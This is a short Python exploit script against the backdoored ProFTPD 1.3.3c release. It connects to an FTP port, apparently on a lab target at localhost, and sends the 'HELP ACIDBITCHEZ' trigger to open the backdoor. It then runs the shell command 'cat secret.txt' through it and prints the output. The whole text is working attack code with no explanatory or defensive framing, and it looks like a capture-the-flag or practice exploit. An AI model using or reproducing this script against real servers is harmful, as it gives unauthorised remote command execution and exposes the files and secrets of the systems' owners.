import socket, sys

# ProFTPD-1.3.3c Backdoor Command Execution

# GLOBAL

SOCKET_TIMEOUT = 10
IP = 'localhost'
PORT = 21

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(SOCKET_TIMEOUT)

try:
    print(f'[+] Connecting to {IP}:{PORT}')
    sock.connect((IP, PORT))
    print(f'[*] Attempting...')
    sock.send(b'HELP ACIDBITCHEZ\n')
    res = sock.recv(1024)
    sock.send(b'cat secret.txt\n')
    res = sock.recv(1024)
    print(f'[!] Response: {res}')

except socket.timeout:
    print("[-] Connection Timed out\n[*] Quitting...")
    sys.exit()

except KeyboardInterrupt:
    print('[-] Cancelled by user\n[*] Quitting...')
    sys.exit()

except TypeError:
    print('[-] Bytes required, not string')
    sys.exit()

except:
    print("[-] Could not establish connection\n[*] Quitting...")
    sys.exit()
